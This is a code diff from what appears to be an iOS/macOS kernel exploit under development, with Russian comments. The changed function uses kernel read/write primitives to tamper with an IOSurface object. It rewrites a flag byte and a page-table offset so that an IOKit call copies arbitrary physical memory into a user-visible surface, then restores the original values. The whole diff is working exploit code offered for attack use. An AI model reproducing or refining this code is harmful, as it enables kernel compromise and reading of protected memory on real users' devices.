@@ -154,6 +154,15 @@ static BOOL kpPhysRead16K(io_connect_t victim, uint64_t srcBuf, const uint8_t *t
     uint64_t eSave = early_kread64(srcBuf + 0x30);
     usleep(1500);
     early_kwrite64(srcBuf + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
+    // 1.9.253b: у src после нормальных опов bit1(+0x2d) УСТАНОВЛЕН — stale-ветка
+    // отдаёт buffer+0x10 с ОРИГИНАЛЬНЫМ PA (sig=0x41414141 = пиксели src, 253 ×2).
+    // Снимаем bit1: сериализатор перечитает entries (с нашей таблицей). Restore после.
+    uint8_t fR = 0; kreadbuf(srcBuf + 0x2d, &fR, 1);
+    uint64_t flSave = 0;
+    if (fR & 0x02) {
+        flSave = early_kread64(srcBuf + 0x28);
+        early_kwrite64(srcBuf + 0x28, (flSave & ~(0xffULL << 40)) | ((uint64_t)(fR & ~0x02) << 40));
+    }
     uint8_t tsdR[0x1B0];
     memcpy(tsdR, tsdV, sizeof(tsdR));
     *(uint32_t *)(tsdR + 0) = srcID;
@@ -164,14 +173,15 @@ static BOOL kpPhysRead16K(io_connect_t victim, uint64_t srcBuf, const uint8_t *t
     kern_return_t rkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdR, sizeof(tsdR), NULL, NULL, NULL, NULL);
     usleep(400000);
     early_kwrite64(srcBuf + 0x30, eSave);
+    if (flSave) early_kwrite64(srcBuf + 0x28, flSave);
     memset(out, 0, 0x4000);
     IOSurfaceLock(dstS, 0, NULL);
     uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dstS);
     if (spR) memcpy(out, spR, 0x4000);
     IOSurfaceUnlock(dstS, 0, NULL);
     uint32_t sig = *(uint32_t *)out;
-    kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x",
-              (unsigned long long)targetPA, rkr, sig]);
+    kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x→clear",
+              (unsigned long long)targetPA, rkr, sig, fR]);
     return spR != NULL;
 }
 
